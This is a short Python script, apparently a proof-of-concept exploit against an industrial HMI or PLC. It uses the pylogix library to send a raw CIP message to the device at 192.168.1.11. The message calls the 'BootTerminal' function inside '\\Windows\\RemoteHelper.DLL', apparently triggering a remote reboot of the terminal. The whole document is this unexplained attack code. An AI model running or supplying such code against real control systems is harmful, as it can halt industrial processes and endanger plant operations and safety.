import pylogix

with pylogix.PLC("192.168.1.11") as comm:
    comm.Message(0x50, 0x04fd, 0x00, None, "\\Windows\\RemoteHelper.DLL\0BootTerminal\0")